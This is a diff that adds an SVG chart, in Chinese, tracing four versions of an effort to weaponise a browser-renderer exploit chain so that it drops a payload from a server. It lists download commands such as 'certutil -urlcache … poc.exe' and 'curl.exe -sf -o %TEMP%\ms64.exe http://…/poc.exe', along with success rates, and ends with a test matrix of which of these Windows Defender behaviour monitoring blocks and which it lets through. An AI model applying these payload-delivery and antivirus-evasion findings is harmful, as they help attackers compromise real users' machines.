@@ -1,0 +1,96 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="540" viewBox="0 0 960 540" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
+  <defs>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#455a64"/>
+    </marker>
+  </defs>
+  <rect width="960" height="540" fill="#fafafa"/>
+  <text x="480" y="30" text-anchor="middle" font-size="19" font-weight="bold" fill="#263238">武器化四代演进：把"实验室链"变成"服务端部署即用链"</text>
+
+  <!-- timeline -->
+  <line x1="60" y1="80" x2="900" y2="80" stroke="#90a4ae" stroke-width="3"/>
+  <g font-size="12.5" font-weight="bold" text-anchor="middle">
+    <text x="140" y="66" fill="#455a64">v1 本地 DLL</text>
+    <text x="360" y="66" fill="#b71c1c">v2 certutil 下载</text>
+    <text x="600" y="66" fill="#e65100">v3 页面内嵌 64KB</text>
+    <text x="830" y="66" fill="#1b5e20">v4 curl 下载 ★</text>
+  </g>
+  <circle cx="140" cy="80" r="7" fill="#78909c"/>
+  <circle cx="360" cy="80" r="7" fill="#b71c1c"/>
+  <circle cx="600" cy="80" r="7" fill="#ef6c00"/>
+  <circle cx="830" cy="80" r="9" fill="#2e7d32"/>
+
+  <!-- v1 -->
+  <rect x="40" y="110" width="215" height="150" rx="8" fill="#eceff1" stroke="#607d8b"/>
+  <text x="147" y="134" text-anchor="middle" font-size="12" font-weight="bold" fill="#37474f">渲染器内 LoadLibraryW</text>
+  <text x="147" y="152" text-anchor="middle" font-size="11" fill="#546e7a" font-family="Consolas,monospace">"C:\pwn\launch64.dll"</text>
+  <text x="147" y="173" text-anchor="middle" font-size="10.5" fill="#546e7a">DLL 里 WinInet 下载+启动</text>
+  <text x="147" y="192" text-anchor="middle" font-size="10.5" fill="#546e7a">全链曾稳定取胜（29%/轮）</text>
+  <text x="147" y="216" text-anchor="middle" font-size="11" font-weight="bold" fill="#b71c1c">✗ 3 处硬编码本地路径</text>
+  <text x="147" y="234" text-anchor="middle" font-size="10.5" fill="#78909c">launch64/poc/evil 全在本机</text>
+  <text x="147" y="251" text-anchor="middle" font-size="10.5" fill="#78909c">WinInet 已加载才能这么玩</text>
+
+  <!-- v2 -->
+  <rect x="275" y="110" width="215" height="150" rx="8" fill="#ffebee" stroke="#b71c1c"/>
+  <text x="382" y="134" text-anchor="middle" font-size="12" font-weight="bold" fill="#b71c1c">payload 拼 cmd 下载链</text>
+  <text x="382" y="152" text-anchor="middle" font-size="10.5" fill="#b71c1c" font-family="Consolas,monospace">cmd /c certutil -urlcache …</text>
+  <text x="382" y="173" text-anchor="middle" font-size="10.5" fill="#c62828">payload 逻辑本身全对：</text>
+  <text x="382" y="190" text-anchor="middle" font-size="10.5" fill="#c62828">IAT/导出/拼串/调用逐级验证 ✓</text>
+  <text x="382" y="214" text-anchor="middle" font-size="11" font-weight="bold" fill="#b71c1c">✗ Defender 行为监控拦截</text>
+  <text x="382" y="232" text-anchor="middle" font-size="10.5" fill="#8b0000">CreateProcessA gle=5</text>
+  <text x="382" y="248" text-anchor="middle" font-size="10.5" fill="#8b0000">bash 直接 spawn 也是 EPERM</text>
+
+  <!-- v3 -->
+  <rect x="510" y="110" width="215" height="150" rx="8" fill="#fff3e0" stroke="#e65100"/>
+  <text x="617" y="134" text-anchor="middle" font-size="12" font-weight="bold" fill="#bf360c">文件字节写进 RX 区</text>
+  <text x="617" y="152" text-anchor="middle" font-size="10.5" fill="#e65100" font-family="Consolas,monospace">1.6 万次 arwWrite → 落盘</text>
+  <text x="617" y="173" text-anchor="middle" font-size="10.5" fill="#ef6c00">功能完全验证成功：</text>
+  <text x="617" y="190" text-anchor="middle" font-size="10.5" fill="#ef6c00">%TEMP% 文件字节级一致 ✓</text>
+  <text x="617" y="214" text-anchor="middle" font-size="11" font-weight="bold" fill="#b71c1c">✗ 垫函数 10→130 扰动堆布局</text>
+  <text x="617" y="232" text-anchor="middle" font-size="10.5" fill="#bf360c">descriptor discovery 29%→3%</text>
+  <text x="617" y="248" text-anchor="middle" font-size="10.5" fill="#bf360c">42 轮仅 2 次到达部署</text>
+
+  <!-- v4 -->
+  <rect x="745" y="110" width="195" height="150" rx="8" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
+  <text x="842" y="134" text-anchor="middle" font-size="12" font-weight="bold" fill="#1b5e20">系统 curl.exe 拉双文件</text>
+  <text x="842" y="152" text-anchor="middle" font-size="10.5" fill="#2e7d32" font-family="Consolas,monospace">curl -sf -o a ORIGIN/a …</text>
+  <text x="842" y="173" text-anchor="middle" font-size="10.5" fill="#2e7d32">blob 仅 2.6KB（塞哪都行）</text>
+  <text x="842" y="190" text-anchor="middle" font-size="10.5" fill="#2e7d32">原版 10-pad 模块一字不动</text>
+  <text x="842" y="214" text-anchor="middle" font-size="12" font-weight="bold" fill="#1b5e20">✓ 43%/轮 · 83% 部署</text>
+  <text x="842" y="234" text-anchor="middle" font-size="10.5" fill="#1b5e20">零硬编码 · 零新 DLL</text>
+  <text x="842" y="250" text-anchor="middle" font-size="10.5" fill="#1b5e20">同源服务器即可部署</text>
+
+  <line x1="255" y1="185" x2="273" y2="185" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="490" y1="185" x2="508" y2="185" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="725" y1="185" x2="743" y2="185" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <!-- Defender matrix -->
+  <rect x="40" y="290" width="900" height="230" rx="8" fill="white" stroke="#546e7a" stroke-width="1.5"/>
+  <text x="490" y="318" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#263238">进程创建层拦截实测矩阵（同一台 Win10 19045 · Defender 行为监控开启）</text>
+  <g font-family="Consolas,monospace" font-size="12">
+    <rect x="60" y="335" width="860" height="26" fill="#cfd8dc"/>
+    <text x="75" y="353" fill="#263238">测试用例（CreateProcessA / 直接 spawn）</text>
+    <text x="600" y="353" fill="#263238">结果</text>
+    <text x="800" y="353" fill="#263238">判定</text>
+
+    <text x="75" y="381" fill="#37474f">cmd.exe /c echo hi</text>
+    <text x="600" y="381" fill="#1b5e20">ok=1</text>
+    <text x="800" y="381" fill="#1b5e20">放行</text>
+
+    <text x="75" y="407" fill="#37474f">cmd.exe /c certutil -urlcache -split -f http://…/poc.exe dst</text>
+    <text x="600" y="407" fill="#b71c1c">ok=0 gle=5</text>
+    <text x="800" y="407" fill="#b71c1c">拦截</text>
+
+    <text x="75" y="433" fill="#37474f">同上 · lpApplicationName 显式指定 cmd.exe 全路径</text>
+    <text x="600" y="433" fill="#b71c1c">ok=0 gle=5</text>
+    <text x="800" y="433" fill="#b71c1c">拦截（模式匹配，非映像）</text>
+
+    <text x="75" y="459" fill="#37474f">bash 直接 spawn certutil + 下载 URL</text>
+    <text x="600" y="459" fill="#b71c1c">spawn EPERM</text>
+    <text x="800" y="459" fill="#b71c1c">拦截（含工具链自身！）</text>
+
+    <text x="75" y="485" fill="#37474f">curl.exe -sf -o %TEMP%\ms64.exe http://…/poc.exe（相对名/全路径/双文件三变体）</text>
+    <text x="600" y="485" fill="#1b5e20">ok=1 ×3, exit=0</text>
+    <text x="800" y="485" fill="#1b5e20">全部放行，文件完整</text>
+  </g>
+</svg>
